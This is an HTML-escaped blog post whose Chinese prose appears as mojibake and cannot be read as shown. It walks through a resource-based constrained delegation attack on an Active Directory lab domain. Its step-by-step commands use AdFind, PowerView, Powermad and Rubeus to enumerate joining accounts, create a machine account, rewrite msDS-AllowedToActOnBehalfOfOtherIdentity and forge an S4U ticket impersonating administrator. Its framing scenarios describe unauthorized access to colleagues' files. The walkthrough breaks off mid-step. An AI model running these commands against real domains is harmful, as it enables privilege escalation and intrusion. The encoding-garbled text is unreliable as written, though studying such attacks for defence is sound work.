&lt;p&gt;&lt;strong&gt;åœ¨å¤§å‹å†…ç½‘åŸŸç¯å¢ƒä¸­ï¼Œå°†æœºå™¨åŠ å…¥åˆ°åŸŸç¯å¢ƒä¸­ä¸€èˆ¬ä¸ä¼šç”¨åŸŸç®¡æƒé™ï¼Œè€Œæ˜¯ç”¨ä¸€ä¸ªä¸“é—¨åŠ åŸŸçš„åŸŸç”¨æˆ·ï¼ˆä¾‹å¦‚ä¸Šå›¾çš„ lucky å°±æ˜¯ä¸€ä¸ªåŠ åŸŸç”¨æˆ·ï¼‰å»æ“ä½œã€‚é‚£ä¹ˆå½“æˆ‘ä»¬æ‹¿ä¸‹è¯¥åŸŸç”¨æˆ·çš„è´¦å·å¯†ç æ—¶ï¼Œå°±å¯ä»¥æŠŠé€šè¿‡è¯¥åŸŸç”¨æˆ·åŠ å…¥åˆ°åŸŸé‡Œçš„æ‰€æœ‰æœºå™¨éƒ½æ‹¿ä¸‹ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ä»¥ä¸‹è´¦æˆ·æ‹¥æœ‰ä¿®æ”¹&lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt;å±æ€§çš„æƒé™ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Domain Admins&lt;/strong&gt;(åŸŸç®¡ç†å‘˜)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;mS-DS-CreatorSID&lt;/strong&gt;(å°†è¯¥æœºå™¨åŠ å…¥åŸŸçš„è´¦æˆ·)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;NT AUTHORITY\SELF&lt;/strong&gt;(æœºå™¨è´¦æˆ·æœ¬èº«)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;æŸ¥æ‰¾å¯æ§çš„æœºå™¨&#34;&gt;æŸ¥æ‰¾å¯æ§çš„æœºå™¨&lt;/h2&gt;
&lt;p&gt;æ”»å‡»è€…å¯ä»¥æŸ¥è¯¢åŸŸå†…è®¡ç®—æœºçš„ &lt;code&gt;mS-DS-CreatorSID&lt;/code&gt;ï¼Œè¿™ä¸ªå€¼ä»£è¡¨çš„æ˜¯å°†è®¡ç®—æœºåŠ å…¥åˆ°åŸŸå†…çš„ç”¨æˆ·ï¼Œå®ƒæ˜¯å…·æœ‰ä¿®æ”¹ &lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt;çš„æƒé™çš„ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ‹¿åˆ°é‚£ä¸ªç”¨æˆ·çš„å‡­æ®ï¼Œå°±å¯ä»¥æ§åˆ¶é‚£ä¸ªç”¨æˆ·æ·»åŠ åˆ°åŸŸå†…çš„æ‰€æœ‰çš„ç”µè„‘ã€‚&lt;/p&gt;
&lt;p&gt;å…³äºmS-DS-CreatorSIDè¿™ä¸ªå€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨adsiedit.mscæŸ¥çœ‹ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&lt;a href=&#34;https://download.sysinternals.com/files/AdExplorer.zip&#34;&gt;AdExplorer&lt;/a&gt;è¿›è¡ŒæŸ¥è¯¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/46.png&#34; alt=&#34;46&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£è¿™ä¸ª1114å°±æ˜¯å¯¹åº”æˆ‘ä»¬åŠ å…¥åŸŸçš„ç”¨æˆ·äº†ï¼Œå¯ä»¥åœ¨luckyç™»å½•æƒ…å†µä¸‹ä½¿ç”¨whoami /all æ¥æŸ¥è¯¢ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/47.png&#34; alt=&#34;47&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‚£æˆ‘ä»¬çŸ¥é“æŸ¥æ‰¾çš„åŸç† äº†ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨luckyç™»å½•çš„ä»»ä½•ä¸€å°æœºå™¨ä¸Šä½¿ç”¨ä¸‹é¢çš„å·¥å…·è¿›è¡ŒæŸ¥è¯¢ï¼š&lt;/p&gt;
&lt;h3 id=&#34;adfind-2&#34;&gt;AdFind&lt;/h3&gt;
&lt;p&gt;é€šè¿‡ADFindæŸ¥æ‰¾å°†åŸŸæœºå™¨æ‹‰å…¥åŸŸçš„ç”¨æˆ·çš„SIDï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AdFind.exe -b &amp;#34;DC=hack,DC=lab&amp;#34; -f &amp;#34;(&amp;amp;(samAccountType=805306369))&amp;#34; cn mS-DS-CreatorSID
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°åœ¨WIN7Aè¿™å°ä¸»æœºæœ‰sidï¼Œå…¶ä»–ä¸»æœºæ²¡æœ‰çš„åŸå› æ˜¯åŸŸç®¡ç†å‘˜è´¦å·åŠ å…¥åŸŸçš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/48.png&#34; alt=&#34;48&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹S-1-5-21-3896163557-1645138957-2306563325-1114æ˜¯è°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;AdFind.exe -b &amp;#34;DC=hack,DC=lab&amp;#34; -f &amp;#34;(&amp;amp;(objectsid=S-1-5-21-3896163557-1645138957-2306563325-1114))&amp;#34; objectclass cn dn
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¯ä»¥çœ‹åˆ°æ˜¯ç”¨æˆ·luckyï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/49.png&#34; alt=&#34;49&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;powerview-2&#34;&gt;Powerview&lt;/h3&gt;
&lt;p&gt;ç…§æ ·æ˜¯åœ¨luckyç™»å½•çš„æƒ…å†µï¼Œåˆ©ç”¨ powerview æŸ¥çœ‹å½“å‰ç”¨æˆ· SIDï¼Œå¹¶æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹æŸå°ä¸»æœºæ˜¯å¦æœ‰å†™æƒé™ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# æŸ¥çœ‹ SID&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-DomainUser&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;userName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Properties&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;objectsid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# æŸ¥çœ‹å†™æƒé™&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-DomainObjectAcl&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Identity&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;computerName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;?{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;SecurityIdentifier&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-match&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;SID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/50.png&#34; alt=&#34;50&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;å®æˆ˜-2&#34;&gt;å®æˆ˜&lt;/h2&gt;
&lt;h3 id=&#34;åˆ©ç”¨æ¡ä»¶&#34;&gt;åˆ©ç”¨æ¡ä»¶&lt;/h3&gt;
&lt;p&gt;åˆ©ç”¨åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾(RBCD)éœ€è¦2ä¸ªæ¡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;1.æ‹¥æœ‰å°†åŸŸæœºå™¨åŠ å…¥åŸŸçš„åŸŸç”¨æˆ·çš„æƒé™ã€‚ï¼ˆå°†æœºå™¨BåŠ å…¥åŸŸçš„åŸŸç”¨æˆ·æ‹¥æœ‰ä¿®æ”¹æœºå™¨Bçš„msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§çš„æƒé™ã€‚ï¼‰&lt;/p&gt;
&lt;p&gt;2.ä¸€ä¸ªä»»æ„æœåŠ¡è´¦æˆ·æˆ–è€…ä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼ˆæ¯ä¸€ä¸ªåŸŸç”¨æˆ·é»˜è®¤å¯ä»¥æ·»åŠ 10ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¯ä»¥é€šè¿‡LDAPä¸­çš„MAQå±æ€§æŸ¥çœ‹ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/51.png&#34; alt=&#34;51&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;ç¯å¢ƒ-2&#34;&gt;ç¯å¢ƒ&lt;/h3&gt;
&lt;p&gt;åŸŸï¼šhack.lab&lt;/p&gt;
&lt;p&gt;åŸŸæ§æœåŠ¡å™¨ï¼ˆserver 2019ï¼‰ï¼š172.16.0.106     åŸŸç®¡ç†ç”¨æˆ·ï¼šdc_admin  åŸŸæ§ä¸»æœºåï¼šdc&lt;/p&gt;
&lt;p&gt;åŸŸå†…ä¸»æœº ï¼ˆWindows 10ï¼‰ï¼š172.16.0.111     æœ¬åœ°ç®¡ç†å‘˜ï¼šxd32 åŸŸæ™®é€šç”¨æˆ·ï¼š  åŸŸæ§ä¸»æœºåï¼šsql&lt;/p&gt;
&lt;p&gt;åŸŸå†…ä¸»æœº ï¼ˆWindows 7ï¼‰ï¼š172.16.0.105     æœ¬åœ°ç®¡ç†å‘˜ï¼šsc92n  åŸŸæ™®é€šç”¨æˆ·ï¼šlucky  åŸŸæ§ä¸»æœºåï¼šwin7a&lt;/p&gt;
&lt;p&gt;è¿›å…¥å†…ç½‘çš„æ”»å‡»ä¸»æœºï¼ˆKali Linuxï¼‰ï¼š172.16.0.107&lt;/p&gt;
&lt;p&gt;ç°åœ¨æœ‰ä¸¤ä¸ªæƒ…æ™¯ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å®‰å…¨ç ”ç©¶å‘˜å°æ˜å‘ç°åä¸ºdc_adminçš„åŸŸç®¡ç†ç”¨æˆ·åœ¨ä»–ç”µè„‘ä¸»æœºwin7aä¸Šå­˜ç•™äº†ä¸€äº›èµ„æ–™ï¼Œä½†æ˜¯ä»–æ²¡æœ‰æƒé™æŸ¥çœ‹ã€‚äºæ˜¯ä¸ºäº†çœ‹è¿™ä¸ªèµ„æ–™ï¼Œåœ¨æœ¬æœºå±•å¼€ä¸€ç³»åˆ—çš„æ”»å‡»ã€‚&lt;/li&gt;
&lt;li&gt;æ•°æ®åº“ç®¡ç†å‘˜å°æ™ºæƒ³æŸ¥çœ‹å°æ˜çš„ä¸»æœºæ–‡ä»¶ï¼ŒåŸå› æ˜¯ä¸Šæ¬¡å…¬å¸å‘ç”Ÿäº†ç—…æ¯’æ„ŸæŸ“äº‹ä»¶ï¼Œå°±è®©å®‰å…¨ç ”ç©¶å‘˜å°æ˜æ¥å¸®å¿™æº¯æºå’Œä¿®è¡¥æ¼æ´ï¼Œä½†æ˜¯åœ¨æ•°æ®åº“æœåŠ¡å™¨ä¸»æœºåä¸ºSQLä¸Šé¢å‘ç°äº†ä¸€æ¡æ•°æ®æ‹‰å–çš„è®°å½•ï¼Œè€Œä¸”å°±æ˜¯åœ¨å°æ˜æ¥çš„æ—¶é—´æ®µå‘ç”Ÿçš„ã€‚å› æ­¤å°æ™ºåœ¨æœ¬æœºå¯¼å‡ºäº†luckyç™»å½•çš„hashï¼Œå¹¶è¯·äº†ä¸€ä¸ªé»‘å®¢æœ‹å‹å¸®å¿™è·å–å°æ˜ä¸»æœºçš„æƒé™ï¼Œäºæ˜¯è®©é»‘å®¢ä½¿ç”¨kaliæ¥å…¥äº†å…¬å¸å†…ç½‘å±•å¼€äº†ä¸€ç³»åˆ—æ”»å‡»ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;æƒ…æ™¯ä¸€&#34;&gt;æƒ…æ™¯ä¸€&lt;/h3&gt;
&lt;p&gt;å®‰å…¨ç ”ç©¶å‘˜å°æ˜ï¼ŒçŸ¥é“ä»–çš„ç”¨æˆ·luckyå°±æ˜¯åœ¨è‡ªå·±ä¸»æœºwin7aåŠ å…¥åŸŸå†…çš„ï¼Œæ‰€ä»¥luckyå¯¹win7aæ‹¥æœ‰ä¿®æ”¹msDS-AllowedToActOnBehalfOfOtherIdentityå±æ€§çš„æƒé™ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯è¿˜éœ€è¦åˆ›å»ºä¸€ä¸ªæœºå™¨æ¥å¸®åŠ©ç”³è¯·ç¥¨æ®ï¼Œåˆ©ç”¨ &lt;a href=&#34;https://github.com/Kevin-Robertson/Powermad&#34;&gt;Powermad&lt;/a&gt; æ·»åŠ æœºå™¨è´¦æˆ·&lt;code&gt;gongjuren&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Set-ExecutionPolicy&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Scope&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;Process&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Import-Module&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Powermad&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;ps1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;New-MachineAccount&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-MachineAccount&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gongjuren&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Password&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;ConvertTo-SecureString&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;123456&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-AsPlainText&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Force&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å·²ç»æˆåŠŸæ·»åŠ ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/52.png&#34; alt=&#34;52&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥å°±æ˜¯æŠŠ&lt;code&gt;gongjuren&lt;/code&gt;çš„sidå†™å…¥win7açš„&lt;code&gt;AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt;å±æ€§ä¸­ï¼Œè¿™é‡Œç”¨è„šæœ¬æ˜¯&lt;a href=&#34;https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1&#34;&gt;PowerView.ps1&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;è·å–åˆ°gongjurenè´¦å·çš„sidï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Get-Domiancomputer hacksystem
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æŠŠgongjurençš„sidå†™å…¥win7açš„msds-allowedtoactonbehalfofotheridentityå±æ€§ä¸­ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$SD&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Security&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;AccessControl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;RawSecurityDescriptor&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ArgumentList&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3896163557-1645138957-2306563325-1125)&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$SDBytes&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;byte&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$SD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;BinaryLength&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$SD&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;GetBinaryForm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$SDBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-DomainComputer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;win7a&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Set-DomainObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Set&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;msds-allowedtoactonbehalfofotheridentity&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$SDBytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Verbose&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/53.png&#34; alt=&#34;53&#34;&gt;&lt;/p&gt;
&lt;p&gt;éªŒè¯æ˜¯å¦æ·»åŠ æˆåŠŸï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-DomainComputer&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;WIN7A&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Properties&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;msds-allowedtoactonbehalfofotheridentity&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/54.png&#34; alt=&#34;54&#34;&gt;&lt;/p&gt;
&lt;p&gt;é…ç½®å®Œ &lt;code&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/code&gt; å±æ€§ä¹‹åå°±å¯ä»¥é€šè¿‡åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å»æ”»å‡»äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ¥ä¸‹æ¥ä¼šç”¨åˆ°ä¸€æ¬¾å·¥å…·&lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt;ï¼Œå…ˆå¯¼å‡ºæœºå™¨ç”¨æˆ·çš„ ntlm hashï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe hash /user:gongjuren /password:123456 /domain:hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¾—åˆ°rc4 hashï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/55.png&#34; alt=&#34;55&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åç”¨ &lt;code&gt;gongjuren$&lt;/code&gt;çš„ hash è¯·æ±‚ç™½é“¶ç¥¨æ®å¹¶å¯¼å…¥åˆ°å½“å‰ä¼šè¯ä¸­ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe s4u /user:gongjuren$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/win7a.hack.lab /ptt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/56.png&#34; alt=&#34;56&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¹¶ä¸”å¯ä»¥çœ‹åˆ°s4u2selfå’Œs4u2proxyéƒ½æ˜¯æˆåŠŸçš„ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/57.png&#34; alt=&#34;57&#34;&gt;&lt;/p&gt;
&lt;p&gt;æŸ¥çœ‹å·²ç»æœ‰äº†ç¥¨æ®ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/58.png&#34; alt=&#34;58&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç°åœ¨å°æ˜å°±å¼€å§‹ç”¨åŸŸç®¡ç†administratorçš„æƒé™å»è®¿é—®åŸŸç®¡ç†dc_adminç”¨æˆ·åœ¨æœ¬æœºä¸Šçš„æ–‡ä»¶äº†ï¼Œå‘ç°äº†è¿˜æ˜¯è®¿é—®ä¸äº†ï¼Œå¯èƒ½æ˜¯powershellå†™å…¥å¤±è´¥äº†ï¼Œå°±é‡æ–°ç”¨ä¸€æ¬¾Jumboå¤§ä½¬å†™çš„å·¥å…·&lt;a href=&#34;https://github.com/Jumbo-WJB/SharpAllowedToAct-Modify&#34;&gt;SharpAllowedToAct-Modify&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SharpAllowedToAct.exe -m win7a -u lucky -p p@ssw0rd -t gongjuren -a dc.hack.lab -d hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/ad_delegation/59.png&#34; alt=&#34;59&#34;&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å†é‡æ–°ç”³è¯·ç¥¨æ®å¯¼å…¥å†…å­˜ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Rubeus.exe s4u /user:gongjuren$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/win7a.hack.lab /ptt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä½†è¿˜æ˜¯ä¸è¡Œï¼Œæˆ‘åæ¥æ¢äº†win10å®¢æˆ·ç«¯å»åšä¸Šé¢æ“ä½œçš„æ—¶å€™å°±æˆåŠŸäº†ï¼š&lt;/p&gt;
